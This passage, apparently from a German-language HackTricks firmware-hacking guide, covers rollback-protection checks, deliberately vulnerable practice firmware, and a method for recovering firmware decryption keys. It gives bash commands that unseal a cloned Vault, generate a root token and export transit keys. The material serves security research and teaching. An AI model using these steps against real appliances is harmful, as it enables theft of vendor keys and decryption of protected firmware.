* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfungen im ROM-Code)?
* Setzt der **Bootloader denselben Ratchet wie der Updater durch**, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten **an den validierten Firmware-Hash/die validierte Firmware-Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Muss das Gerät nach einem erfolgreichen Slot-Wechsel neu starten, oder sind in derselben Sitzung weitere Update-/Löschroutinen erreichbar?
* Führt Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionstabelle, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt etwas davon, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Aufspüren von Schwachstellen in Firmware zu üben, dienen die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor Brute-Force-Angriffen zunächst eine Container-Triage erfolgen:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` weist üblicherweise auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, deutet stark darauf hin, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort bzw. einen Sitzungsschlüssel umschließt.
- Beigefügtes PGP-Material in derselben Datei schützt oft nur die Authentizität; es sollte nicht als Vertraulichkeitsmechanismus angesehen werden.

Scheitert die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen), sollte stattdessen der **operative Entschlüsselungspfad** nachvollzogen werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater bzw. die Verwaltungs-Binärdatei dekompilieren und nachvollziehen, wer den verschlüsselten Blob liest, welcher Helper bzw. welche API ihn entschlüsselt und welchen logischen Schlüsselnamen sie anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte wie Material für private Schlüssel behandeln.

Wenn das Gerät das originale Vault-Binary und das Storage-Backend enthält, ist es meist einfacher, diese Umgebung nachzubilden, als die internen Abläufe von Vault neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem vom KMS verwendeten Padding-/Hash-Paar testen. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene standardmäßige OAEP-Entschlüsselung beweisen **nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 nutzen.
- Wenn der Payload mit `Salted__` beginnt, die OpenSSL-KDF des Herstellers exakt reproduzieren (`EVP_BytesToKey`, bei älteren Appliances oft MD5), bevor die AES-CBC-Entschlüsselung versucht wird.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **die operativen Schlüssel auf der Appliance wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline reproduzieren**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware knacken mit Claude: Fähigkeiten auf Senior-Niveau, Autonomie auf Junior-Niveau](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der definitive Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in vernachlässigter Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Schutzmaßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
